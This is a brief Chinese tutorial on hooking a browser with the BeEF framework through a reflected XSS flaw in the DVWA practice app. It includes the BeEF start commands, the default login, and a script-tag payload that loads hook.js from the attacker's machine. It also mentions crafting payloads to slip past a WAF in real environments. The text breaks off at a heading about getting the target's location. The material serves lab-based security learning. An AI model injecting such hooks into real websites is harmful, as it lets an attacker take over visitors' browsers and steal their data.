# beef 利用DVWA反射型2XSS利用

## 1.启动kali下的Beef

可以输入以下命令来开启beef

```
systemctl start beef-xss.service  #开启beef
systemctl stop beef-xss.service     #关闭beef
systemctl restart beef-xss.service  #重启beef
```

终端显示以下界面表示beef已经被成功启动

![image.png](http://ww1.sinaimg.cn/large/007bHQE8gy1g7t8rse627j30on0d7wly.jpg)

## 2.登录到beef管理UI

在开启beef后会自动跳转打开浏览器进入到beef的管理界面

![image.png](http://ww1.sinaimg.cn/large/007bHQE8gy1g7t8uxio7xj30s40fb3zl.jpg)

输入默认的 账号/密码 `beef/beef` 登录UI管理界面。

也可以使用外部的浏览器登录到beef进行管理 

`beef管理ui界面：http://192.168.0.70:3000/ui/panel` 

这里的ip地址为 kali 的ip ，因为beef部署在上面。

## 3.执行攻击语句

在我们开启beef的时候已经给到了我们script 的攻击语句

![image.png](http://ww1.sinaimg.cn/large/007bHQE8gy1g7t97idybxj30ok0cxwnk.jpg)

但是我们需要根据实际情况进行更改再执行，

`beef攻击语句：<script src="http://<IP>:3000/hook.js"></script>`

IP 为beef攻击机的ip地址 

列：`<script src="http://192.168.0.70:3000/hook.js"></script>`

在真实的环境中会出现WAF对XSS所输入的语句有过滤的情况这时就需要灵活的去构造攻击语句来进行绕过WAF，让beef的攻击语句能成功的执行。

将构造好的攻击语句在存在xss的位置执行 

列：![image.png](http://ww1.sinaimg.cn/large/007bHQE8gy1g7t9osrckmj31hc0gmgo3.jpg)

js语句执行后登录到beef 服务器的UI管理界面发现目标浏览器已经被hook上线。

![1570702566231](C:\Users\dell\AppData\Roaming\Typora\typora-user-images\1570702566231.png)

这时已经成功hook到目标机的浏览器，可以执行beef提供的命令操作

![image.png](http://ww1.sinaimg.cn/large/007bHQE8gy1g7t9wfw16tj305x0ni0tu.jpg)

4.获取目标机的位置信息。

